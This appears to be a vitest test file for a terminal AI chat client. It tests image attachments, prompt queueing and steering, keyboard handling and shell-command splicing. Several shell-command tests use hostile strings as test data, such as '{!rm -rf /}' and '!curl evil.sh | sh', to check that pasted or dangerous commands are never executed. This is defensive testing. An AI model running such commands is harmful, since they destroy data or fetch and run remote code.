import { mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import type { Key, Node } from '@stencil-hq/tern'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import { FakeGateway, fakeTern, given, key, must, type Reply, settle as settleGateway, stubOverlay, topNodes } from './fakes.js'

vi.mock('@tui/lib/history.js', () => ({ append: () => undefined, load: () => [] }))

const home = mkdtempSync(join(tmpdir(), 'hermes-tern-app-'))
process.env['HERMES_HOME'] = home

const { App } = await import('../app/chat.js')

/** A PNG on disk, for a pasted image path. */
const png = join(home, 'shot.png')
writeFileSync(png, Buffer.from([137, 80, 78, 71, 13, 10, 26, 10, 0, 0]))

/** The gateway of the app the running test set up. */
let gateway: FakeGateway

/** The app on a fake Tern and gateway: keys go in, gateway requests come out (`canonical`: the shared gateway). */
function setup(replies: Record<string, Reply> = {}, { canonical = true, features = [] }: { canonical?: boolean; features?: string[] } = {}) {
  const gw = (gateway = new FakeGateway({ canonical, replies }))
  let uploads = 0

  if (!replies['image.attach_bytes']) {
    gw.handlers.set('image.attach_bytes', () => ({ path: `/uploads/${++uploads}.png` }))
  }

  const tern = fakeTern({ cols: 100, draws: true, features })
  const app = new App(tern.session, gw.client, '1.0.0')
  void app.run()
  given.session(app, 's1')

  const press = async (k: Key) => {
    await vi.waitFor(() => expect(tern.reading).toBe(true))
    tern.press(k)
    await settle()
  }

  const type = async (text: string) => {
    for (const ch of text) {
      await press(key(ch, { text: ch }))
    }
  }

  const attach = async () => {
    await press(key('paste', { text: png }))
    await vi.waitFor(() => expect(gw.calls.some(r => r.method === 'image.attach_bytes')).toBe(true))
    await settle()
  }

  const emit = (name: string, arg: unknown) => gw.emit(name, arg)
  const sent = (method: string) => gw.sent(method)

  /** The dock's queued rows as last rendered: their text and which actions they offer. */
  const queuedRows = () => {
    const rows = topNodes(tern.region('dock')).find(n => n.props['role'] === 'omp.queue')?.children ?? []

    return rows.map((r: Node) => ({
      actions: r.children.flatMap(c => (c.props['role'] === 'omp.queue.steer' ? ['steer'] : c.props['role'] === 'omp.queue.edit' ? ['edit'] : [])),
      text: r.children.find(c => c.props['text'] !== undefined)?.props['text']
    }))
  }

  return { app, attach, emit, press, queuedRows, sent, type }
}

/** Waits until the app has handled what the test fed it (no fixed sleep). */
const settle = () => settleGateway(gateway)
const busy = { label: 'Working…', since: {}, startedAt: 0 }

beforeEach(() => {
  delete process.env['HERMES_TUI_QUERY']
  delete process.env['HERMES_TUI_IMAGE']
})

afterEach(() => {
  vi.useRealTimers()
})

describe('App: a refused prompt', () => {
  it('goes back to the composer with its images, and is not re-sent', async () => {
    const { app, attach, press, sent, type } = setup({
      'prompt.submit': () => {
        throw new Error('session_busy')
      }
    })
    await attach()
    await type('ship it')
    await press(key('enter'))
    await settle()

    expect(sent('prompt.submit')).toHaveLength(1)
    expect(app.activity.busy).toBeNull()
    expect(app.composer.text).toBe('ship it')
    expect(app.transcript.entries.at(-1)).toMatchObject({ kind: 'notice', text: expect.stringContaining('Not sent: session_busy') })
  })
})

describe('App: images in the draft', () => {
  it('a prompt queued behind the turn (private gateway) takes the images attached with it', async () => {
    const { app, attach, emit, press, sent, type } = setup({}, { canonical: false })
    given.busy(app, { ...busy })
    await attach()
    await type('first')
    await press(key('enter'))
    expect(app.queue.held).toMatchObject([{ images: [{ path: '/uploads/1.png' }], text: 'first' }])

    // Typed while the first waits: no images of its own.
    await type('second')
    await press(key('enter'))
    emit('event', { payload: { text: 'done' }, session_id: 's1', type: 'message.complete' })
    await settle()

    const [submit] = sent('prompt.submit')
    expect(submit).toMatchObject({ attachments: [{ path: '/uploads/1.png' }], text: 'first' })
    expect(app.queue.held).toMatchObject([{ images: [], text: 'second' }])
  })

  it('Ctrl+C clears the images with the text, and Ctrl+D does not exit over an image', async () => {
    const { app, attach, press, sent, type } = setup()
    const quit = vi.spyOn(app, 'quit')
    await attach()

    await press(key('d', { ctrl: true }))
    expect(quit).not.toHaveBeenCalled()

    await press(key('c', { ctrl: true }))
    await type('later')
    await press(key('enter'))
    expect(sent('prompt.submit')[0]).toMatchObject({ text: 'later' })
    expect(sent('prompt.submit')[0]).not.toHaveProperty('attachments')
  })

  it('Alt+Up brings a queued prompt (private gateway) back with its images', async () => {
    const { app, attach, press, type } = setup({}, { canonical: false })
    given.busy(app, { ...busy })
    await attach()
    await type('edit me')
    await press(key('enter'))
    await press(key('up', { alt: true }))

    expect(app.composer.text).toBe('edit me')
    expect(app.queue.held).toEqual([])
    // Back in the draft: Ctrl+D still sees it.
    const quit = vi.spyOn(app, 'quit')
    app.composer.set('')
    await press(key('d', { ctrl: true }))
    expect(quit).not.toHaveBeenCalled()
  })
})

describe('App: an attached image shows', () => {
  it('as a thumbnail in the composer and in the sent prompt, not as a 📎 count', async () => {
    const { app, attach, press, type } = setup({}, { features: ['blobs'] })
    await attach()
    await type('what is this')
    await press(key('enter'))

    const user = app.transcript.entries.findLast(e => e.kind === 'user')
    expect(user).toMatchObject({ attachments: [{ kind: 'image', name: 'shot.png', source: { blob: 'blob' } }], text: 'what is this' })
    expect(JSON.stringify(user)).not.toContain('📎')
  })

  it('as its name alone where Tern takes no blobs and the gateway’s copy is not on this machine', async () => {
    const { app, attach, press, type } = setup()
    await attach()
    await type('x')
    await press(key('enter'))

    const user = app.transcript.entries.findLast(e => e.kind === 'user')
    expect(user).toMatchObject({ attachments: [{ kind: 'image', name: 'shot.png' }] })
    expect(user).not.toHaveProperty('attachments.0.source')
  })
})

describe('App: a prompt of images alone', () => {
  it('sends with an empty composer, as Ink does, and the bubble shows just the image', async () => {
    const { app, attach, press, sent } = setup({}, { features: ['blobs'] })
    await press(key('enter'))
    expect(sent('prompt.submit')).toEqual([])

    await attach()
    await press(key('enter'))

    expect(sent('prompt.submit')).toMatchObject([{ attachments: [{ path: '/uploads/1.png' }], text: 'What do you see in this image?' }])
    expect(app.transcript.entries.findLast(e => e.kind === 'user')).toMatchObject({ attachments: [{ name: 'shot.png' }], text: '' })
  })

  it('a private gateway queues it behind a running turn; it goes when the turn ends', async () => {
    const { app, attach, emit, press, sent } = setup({}, { canonical: false })
    given.busy(app, { ...busy })
    await attach()
    await press(key('enter'))
    expect(app.queue.held).toMatchObject([{ images: [{ path: '/uploads/1.png' }], text: '' }])

    emit('event', { payload: { text: 'done' }, session_id: 's1', type: 'message.complete' })
    await settle()
    expect(sent('prompt.submit')).toMatchObject([{ attachments: [{ path: '/uploads/1.png' }], text: 'What do you see in this image?' }])
  })

  it('the shared gateway admits it to its queue at once', async () => {
    const { app, attach, press, sent } = setup()
    given.busy(app, { ...busy })
    await attach()
    await press(key('enter'))
    await settle()
    expect(sent('prompt.submit')).toMatchObject([
      { attachments: [{ path: '/uploads/1.png' }], queued: true, text: 'What do you see in this image?' }
    ])
  })
})

describe('App: an image while it attaches', () => {
  function slowUpload() {
    let finish: (v: unknown) => void = () => undefined
    const upload = () => new Promise(resolve => (finish = resolve))

    return { finish: (path: string) => finish({ path }), upload }
  }

  it('holds the prompt until it lands, then goes with it', async () => {
    const u = slowUpload()
    const { app, attach, press, sent, type } = setup({ 'image.attach_bytes': u.upload })
    await attach()
    await type('look')
    await press(key('enter'))

    expect(sent('prompt.submit')).toEqual([])
    expect(app.composer.text).toBe('look')
    expect(app.transcript.entries.at(-1)).toMatchObject({ kind: 'notice', text: expect.stringContaining('still attaching') })

    u.finish('/uploads/slow.png')
    await settle()
    app.composer.set('')
    await type('look')
    await press(key('enter'))
    expect(sent('prompt.submit')).toMatchObject([{ attachments: [{ path: '/uploads/slow.png' }], text: 'look' }])
  })

  it('is dropped when Ctrl+C clears the draft before it lands', async () => {
    const u = slowUpload()
    const { app, attach, press, sent, type } = setup({ 'image.attach_bytes': u.upload })
    await attach()
    const quit = vi.spyOn(app, 'quit')
    await press(key('d', { ctrl: true }))
    expect(quit).not.toHaveBeenCalled()

    await press(key('c', { ctrl: true }))
    u.finish('/uploads/late.png')
    await settle()
    await type('later')
    await press(key('enter'))
    expect(sent('prompt.submit')[0]).not.toHaveProperty('attachments')
  })
})

describe('App: Ctrl+C with a sheet open', () => {
  it('denies an approval instead of clearing the hidden draft or interrupting the turn', async () => {
    const { app, emit, press, sent, type } = setup()
    await type('half typed')
    given.busy(app, { ...busy })
    const respond = vi.fn()
    emit('request', { fail: vi.fn(), id: 'r1', method: 'approval', params: { command: 'rm -rf x', session_id: 's1' }, respond })
    await settle()
    expect(app.overlays).toHaveLength(1)

    await press(key('c', { ctrl: true }))
    expect(respond).toHaveBeenCalledWith({ choice: 'deny' })
    expect(app.overlays).toHaveLength(0)
    expect(app.composer.text).toBe('half typed')
    expect(sent('session.interrupt')).toEqual([])
    expect(app.activity.busy).not.toBeNull()
  })

  it('cancels a secret prompt with the empty value, and closes a picker', async () => {
    const { app, emit, press } = setup()
    const respond = vi.fn()
    emit('request', { fail: vi.fn(), id: 'r2', method: 'secret', params: { env_var: 'KEY', session_id: 's1' }, respond })
    await settle()
    await press(key('x', { text: 'x' }))
    await press(key('c', { ctrl: true }))
    expect(respond).toHaveBeenCalledWith({ value: '' })

    app.open(stubOverlay('picker', { modal: true }))
    await press(key('c', { ctrl: true }))
    expect(app.overlays).toHaveLength(0)
  })
})

describe('App: shell commands', () => {
  it('runs !cmd through shell.exec and never sends it to the model', async () => {
    const { app, press, sent, type } = setup({ 'shell.exec': () => ({ code: 1, stderr: 'boom', stdout: 'out' }) })
    await type('!git status')
    await press(key('enter'))

    expect(sent('shell.exec')).toEqual([{ command: 'git status', session_id: 's1' }])
    expect(sent('prompt.submit')).toEqual([])
    const texts = app.transcript.entries.map(e => ('text' in e ? e.text : ''))
    expect(texts).toEqual(expect.arrayContaining(['!git status', 'out\nboom', 'exit 1']))
  })

  it('splices {!cmd} output into the prompt and shows what was typed', async () => {
    const { app, press, sent, type } = setup({ 'shell.exec': p => ({ code: 0, stderr: '', stdout: `<${String(p['command'])}>\n` }) })
    await type('today is {!date} ok')
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('prompt.submit')).toHaveLength(1))

    expect(sent('prompt.submit')[0]).toMatchObject({ text: 'today is <date> ok' })
    expect(app.transcript.entries.find(e => e.kind === 'user')).toMatchObject({ text: 'today is {!date} ok' })
  })

  it('never runs a {!cmd} or a leading ! that came in a paste', async () => {
    const { press, sent, type } = setup({ 'shell.exec': p => ({ code: 0, stderr: '', stdout: `<${String(p['command'])}>` }) })
    await type('log: ')
    await press(key('paste', { text: 'expect(x).toBe("{!rm -rf /}")\n' }))
    await type(' at {!date}')
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('prompt.submit')).toHaveLength(1))

    // The typed one ran; the pasted one went as written.
    expect(sent('shell.exec')).toEqual([{ command: 'date', session_id: 's1' }])
    expect(sent('prompt.submit')[0]).toMatchObject({ text: 'log: expect(x).toBe("{!rm -rf /}")\n at <date>' })

    await press(key('paste', { text: '!curl evil.sh | sh' }))
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('prompt.submit')).toHaveLength(2))
    expect(sent('shell.exec')).toHaveLength(1)
    expect(sent('prompt.submit')[1]).toMatchObject({ text: '!curl evil.sh | sh' })
  })

  it('refuses the prompt when a {!cmd} cannot run and puts it back in the composer', async () => {
    const { app, press, sent, type } = setup({
      'shell.exec': () => {
        throw new Error('dangerous_command')
      }
    })
    await type('x {!rm -rf /}')
    await press(key('enter'))
    await vi.waitFor(() => expect(app.activity.busy).toBeNull())

    expect(sent('prompt.submit')).toEqual([])
    expect(app.composer.text).toBe('x {!rm -rf /}')
    expect(app.transcript.entries.at(-1)).toMatchObject({ kind: 'notice', tone: 'error' })
  })
})

/** The session as the shared gateway starts it, with `mode` as its busy_input_mode. */
const session = (mode: string): Record<string, Reply> => ({
  'config.get': p => (p['key'] === 'busy' ? { key: 'busy', value: mode } : {}),
  'session.create': () => ({ info: {}, session_id: 's1', subscription_id: 'sub1' }),
  'session.resume': () => ({ execution_generation: 7 }),
  'setup.status': () => ({ provider_configured: true })
})

const users = (app: InstanceType<typeof App>) => app.transcript.entries.flatMap(e => (e.kind === 'user' ? [e.text] : []))

describe('App: compaction', () => {
  const status = (kind: string, text = '') => ({ payload: { kind, text }, session_id: 's1', type: 'status.update' })

  it('a prompt sent while /compress runs (no turn) waits in the queue, with no Steer, and shows in the dock', async () => {
    const { app, emit, press, queuedRows, sent, type } = setup({ 'prompt.submit': () => ({ admission_id: 'a1', status: 'queued' }) })
    emit('event', status('compressing', '⠋ compressing 12 messages (~40,000 tok)…'))
    await type('after it')
    await press(key('enter'))

    expect(sent('prompt.submit')).toMatchObject([{ queued: true, text: 'after it' }])
    expect(users(app)).toEqual([])
    expect(queuedRows()).toEqual([{ actions: ['edit'], text: 'after it' }])
    expect(JSON.stringify(app.transcript.entries)).toContain('"status":"running"')
  })

  it('on a private gateway the held prompt goes when the compaction ends', async () => {
    const { app, emit, press, sent, type } = setup({}, { canonical: false })
    emit('event', status('compressing', 'compressing'))
    await type('after it')
    await press(key('enter'))
    expect(sent('prompt.submit')).toEqual([])
    expect(app.queue.held).toMatchObject([{ text: 'after it' }])

    emit('event', status('ready'))
    await settle()
    expect(sent('prompt.submit')).toMatchObject([{ text: 'after it' }])
  })

  it('a compaction inside a turn still offers Steer on a queued prompt (Hermes holds it until the compaction ends)', async () => {
    const { app, emit, press, queuedRows, type } = setup({ 'prompt.submit': () => ({ admission_id: 'a1', status: 'queued' }) })
    given.busy(app, { ...busy })
    emit('event', { payload: {}, session_id: 's1', type: 'message.start' })
    emit('event', status('compacting', '🗜️ Compacting context — summarizing earlier conversation so I can continue...'))
    await settle()
    expect(app.activity.busy?.label).toBe('Compacting context…')

    await type('look at the tests too')
    await press(key('enter'))
    expect(queuedRows()).toEqual([{ actions: ['steer', 'edit'], text: 'look at the tests too' }])
  })
})

describe('App: Enter while a turn runs (busy_input_mode)', () => {
  it('queue: admits the prompt to the gateway at once, shows it queued, and paints its bubble when it starts', async () => {
    const { app, attach, emit, press, queuedRows, sent, type } = setup({ 'prompt.submit': () => ({ admission_id: 'a1', status: 'queued' }) })
    given.busy(app, { ...busy })
    await attach()
    await type('next one')
    await press(key('enter'))

    const [submit] = sent('prompt.submit')
    expect(submit).toMatchObject({ attachments: [{ path: '/uploads/1.png' }], queued: true, session_id: 's1', text: 'next one' })
    expect(app.queue.held).toEqual([])
    expect(users(app)).toEqual([])
    expect(queuedRows()).toEqual([{ actions: ['edit'], text: 'next one ↵ 📎 1 image' }])

    const row = { admission_id: 'a1', input_id: must(submit)['submission_id'], status: 'queued', user: 'next one' }
    emit('event', { payload: { pending_submissions: [row] }, session_id: 's1', type: 'session.info' })
    emit('event', { payload: { text: 'first reply' }, session_id: 's1', type: 'message.complete' })
    emit('event', { payload: {}, session_id: 's1', type: 'message.start' })
    emit('event', { payload: { pending_submissions: [{ ...row, status: 'started' }] }, session_id: 's1', type: 'session.info' })
    await settle()

    // After the reply it waited for, before the turn it opened; and only once.
    expect(users(app)).toEqual(['next one'])
    expect(app.transcript.entries.findLast(e => e.kind === 'user')).toMatchObject({ attachments: [{ kind: 'image' }] })
    expect(app.transcript.entries.map(e => e.kind).slice(-2)).toEqual(['user', 'turn'])
    expect(queuedRows()).toEqual([])
  })

  it('a skill invoked while a turn runs is queued like a prompt: the queue and its bubble show the invocation, not the body', async () => {
    const body = '[IMPORTANT: The user has invoked the "fanout" skill…]\n\n…the skill body…'
    const { app, emit, press, queuedRows, sent, type } = setup({
      'prompt.submit': () => ({ admission_id: 'a1', status: 'queued' }),
      'slash.exec': () => ({ display: '/fanout if needed', message: body, name: 'fanout', type: 'skill' })
    })
    given.busy(app, { ...busy })
    await type('/fanout if needed')
    await press(key('enter'))
    await settle()

    const [submit] = sent('prompt.submit')
    expect(submit).toMatchObject({ queued: true, text: body })
    expect(users(app)).toEqual([])
    expect(queuedRows()).toEqual([{ actions: ['steer', 'edit'], text: '/fanout if needed' }])

    const row = { admission_id: 'a1', input_id: must(submit)['submission_id'], status: 'queued', user: body }
    emit('event', { payload: { pending_submissions: [row] }, session_id: 's1', type: 'session.info' })
    emit('event', { payload: { text: 'first reply' }, session_id: 's1', type: 'message.complete' })
    emit('event', { payload: {}, session_id: 's1', type: 'message.start' })
    emit('event', { payload: { pending_submissions: [{ ...row, status: 'started' }] }, session_id: 's1', type: 'session.info' })
    await settle()

    expect(users(app)).toEqual(['/fanout if needed'])
    expect(app.transcript.entries.map(e => e.kind).slice(-2)).toEqual(['user', 'turn'])
  })

  it('a prompt sent while idle gets one bubble, even when the gateway reports it queued then started', async () => {
    const { app, emit, press, sent, type } = setup()
    await type('hello')
    await press(key('enter'))
    const row = { admission_id: 'a1', input_id: must(sent('prompt.submit')[0])['submission_id'], status: 'queued', user: 'hello' }

    emit('event', { payload: { pending_submissions: [row] }, session_id: 's1', type: 'session.info' })
    emit('event', { payload: { pending_submissions: [{ ...row, status: 'started' }] }, session_id: 's1', type: 'session.info' })
    await settle()

    expect(users(app)).toEqual(['hello'])
  })

  it("shows another window's queued prompt read-only, and its bubble when it starts", async () => {
    const { app, emit, queuedRows } = setup()
    given.busy(app, { ...busy })
    const row = { admission_id: 'b1', input_id: 'theirs', status: 'queued', user: 'from desktop' }

    emit('event', { payload: { pending_submissions: [row] }, session_id: 's1', type: 'session.info' })
    await settle()
    expect(queuedRows()).toEqual([{ actions: [], text: 'from desktop' }])

    emit('event', { payload: { pending_submissions: [{ ...row, status: 'started' }] }, session_id: 's1', type: 'session.info' })
    await settle()
    expect(users(app)).toEqual(['from desktop'])
  })

  it("a queued row's Steer withdraws it from the gateway's queue and steers the turn; its cancelled completion does not end the turn", async () => {
    const { app, emit, press, queuedRows, sent, type } = setup({
      'prompt.cancel': () => ({ admission_id: 'a1', outcome: 'cancelled', status: 'terminal' }),
      'prompt.submit': () => ({ admission_id: 'a1', status: 'queued' }),
      'session.resume': () => ({ execution_generation: 7 }),
      'session.steer': () => ({ status: 'queued' })
    })
    given.busy(app, { ...busy })
    app.transcript.messageStart()
    await type('use tabs')
    await press(key('enter'))
    const row = { admission_id: 'a1', input_id: must(sent('prompt.submit')[0])['submission_id'], status: 'queued', user: 'use tabs' }
    emit('event', { payload: { pending_submissions: [row] }, session_id: 's1', type: 'session.info' })
    await settle()
    expect(queuedRows()).toEqual([{ actions: ['steer', 'edit'], text: 'use tabs' }])

    await press(key('enter', { alt: true }))
    await vi.waitFor(() => expect(sent('session.steer')).toHaveLength(1))
    emit('event', { payload: { admission_id: 'a1', content: '', outcome: 'cancelled', text: '' }, session_id: 's1', type: 'message.complete' })
    emit('event', { payload: { pending_submissions: [] }, session_id: 's1', type: 'session.info' })
    await settle()

    expect(sent('prompt.cancel')).toEqual([{ admission_id: 'a1', session_id: 's1' }])
    expect(sent('session.steer')[0]).toMatchObject({ execution_generation: 7, session_id: 's1', text: 'use tabs' })
    expect(app.transcript.live?.blocks.map(b => b.kind)).toEqual(['steer'])
    expect(app.activity.busy).not.toBeNull()
    expect(queuedRows()).toEqual([])
  })

  it("a queued row's Edit takes it out of the gateway's queue and back into the composer", async () => {
    const { app, emit, press, sent, type } = setup({
      'prompt.cancel': () => ({ status: 'terminal' }),
      'prompt.submit': () => ({ admission_id: 'a1', status: 'queued' })
    })
    given.busy(app, { ...busy })
    await type('fix me')
    await press(key('enter'))
    const row = { admission_id: 'a1', input_id: must(sent('prompt.submit')[0])['submission_id'], status: 'queued', user: 'fix me' }
    emit('event', { payload: { pending_submissions: [row] }, session_id: 's1', type: 'session.info' })

    await press(key('up', { alt: true }))
    await vi.waitFor(() => expect(app.composer.text).toBe('fix me'))
    expect(sent('prompt.cancel')).toHaveLength(1)
  })

  it('steer: injects the prompt into the turn; a refused steer is queued instead', async () => {
    let steer = { status: 'queued' }
    const { app, emit, press, sent, type } = setup({
      ...session('steer'),
      'prompt.submit': () => ({ admission_id: 'a1', status: 'queued' }),
      'session.steer': () => steer
    })
    emit('event', { payload: {}, type: 'gateway.ready' })
    await vi.waitFor(() => expect(sent('config.get')).toContainEqual({ key: 'busy', session_id: 's1' }))
    await settle()
    given.busy(app, { ...busy })
    app.transcript.messageStart()

    await type('look at the tests too')
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('session.steer')).toHaveLength(1))
    expect(sent('session.steer')[0]).toMatchObject({ execution_generation: 7, text: 'look at the tests too' })
    expect(app.transcript.live?.blocks.at(-1)).toMatchObject({ kind: 'steer', text: 'look at the tests too' })
    expect(sent('prompt.submit')).toEqual([])

    steer = { status: 'rejected' }
    await type('then this')
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('prompt.submit')).toHaveLength(1))
    expect(sent('prompt.submit')[0]).toMatchObject({ queued: true, text: 'then this' })
  })

  it('interrupt: redirects the turn with the prompt (session.redirect)', async () => {
    const { app, emit, press, sent, type } = setup({ ...session('interrupt'), 'session.redirect': () => ({ status: 'redirected' }) })
    emit('event', { payload: {}, type: 'gateway.ready' })
    await vi.waitFor(() => expect(sent('config.get')).toContainEqual({ key: 'busy', session_id: 's1' }))
    await settle()
    given.busy(app, { ...busy })

    await type('no, use rust')
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('session.redirect')).toHaveLength(1))
    expect(sent('session.redirect')[0]).toEqual({ execution_generation: 7, session_id: 's1', text: 'no, use rust' })
    expect(sent('prompt.submit')).toEqual([])
  })

  it('/queue queues behind the turn whatever the mode says', async () => {
    const { app, emit, press, sent, type } = setup({ ...session('steer'), 'prompt.submit': () => ({ admission_id: 'a1' }) })
    emit('event', { payload: {}, type: 'gateway.ready' })
    await vi.waitFor(() => expect(sent('config.get')).toContainEqual({ key: 'busy', session_id: 's1' }))
    await settle()
    given.busy(app, { ...busy })

    await type('/queue later please')
    await press(key('enter'))
    await vi.waitFor(() => expect(sent('prompt.submit')).toHaveLength(1))
    expect(sent('session.steer')).toEqual([])
  })
})

describe('App: Esc', () => {
  it('one Esc never stops the turn; two quick ones do', async () => {
    const { app, press, sent } = setup({ 'session.resume': () => ({ execution_generation: 2 }) })
    given.busy(app, { ...busy })

    await press(key('escape'))
    expect(sent('session.interrupt')).toEqual([])

    await press(key('escape'))
    await vi.waitFor(() => expect(sent('session.interrupt')).toEqual([{ execution_generation: 2, session_id: 's1' }]))
  })

  it('two Esc with a draft clear it into the history instead of stopping the turn', async () => {
    const { app, press, sent, type } = setup()
    given.busy(app, { ...busy })
    await type('half a thought')

    await press(key('escape'))
    expect(app.composer.text).toBe('half a thought')
    await press(key('escape'))

    expect(app.composer.text).toBe('')
    expect(sent('session.interrupt')).toEqual([])
    expect(app.activity.busy).not.toBeNull()
  })
})

describe('App: Option characters', () => {
  it('a typed å, ∫, ß or π is text; Alt+letter still opens its panel', async () => {
    const { app, press, type } = setup()
    await type('åßπ∫')
    expect(app.composer.text).toBe('åßπ∫')
    expect(app.overlays).toEqual([])

    await press(key('a', { alt: true }))
    expect(app.overlays.map(o => o.key)).toContain('agents')
  })
})

describe('App: Option+← and Option+→ in a Mac terminal', () => {
  it('Alt+B / Alt+F (ESC b / ESC f) move the caret by a word and open no panel', async () => {
    const { app, press, type } = setup()
    await type('hello brave world')
    await press(key('b', { alt: true }))
    expect(app.composer.cursor).toBe('hello brave '.length)
    await press(key('b', { alt: true }))
    expect(app.composer.cursor).toBe('hello '.length)
    await press(key('f', { alt: true }))
    expect(app.composer.cursor).toBe('hello brave'.length)
    expect(app.overlays).toEqual([])
  })

  it('Alt+J opens the Background sheet', async () => {
    const { app, press } = setup()
    await press(key('j', { alt: true }))
    expect(app.overlays.map(o => o.key)).toContain('background')
  })
})

describe('App: the session folder reaches Tern', () => {
  it('reports the session cwd by OSC 7 once, and again when it moves', async () => {
    const write = vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    const { emit } = setup({
      'session.create': () => ({ info: { cwd: '/repo/.worktrees/wt 1' }, session_id: 's1', subscription_id: 'sub1' })
    })
    await settle()
    emit('event', { payload: { cwd: '/repo/.worktrees/wt 1' }, session_id: 's1', type: 'session.info' })
    emit('event', { payload: { cwd: '/elsewhere' }, session_id: 's1', type: 'session.info' })
    await settle()

    const osc7 = write.mock.calls.map(c => String(c[0])).filter(s => s.startsWith('\x1b]7;'))
    write.mockRestore()
    expect(osc7).toHaveLength(2)
    expect(osc7[0]).toMatch(/^\x1b\]7;file:\/\/[^/]*\/repo\/\.worktrees\/wt%201\x07$/) // eslint-disable-line no-control-regex -- the OSC 7 escape is what this checks
    expect(osc7[1]).toMatch(/\/elsewhere\x07$/) // eslint-disable-line no-control-regex -- the OSC's BEL terminator is what this checks
  })
})
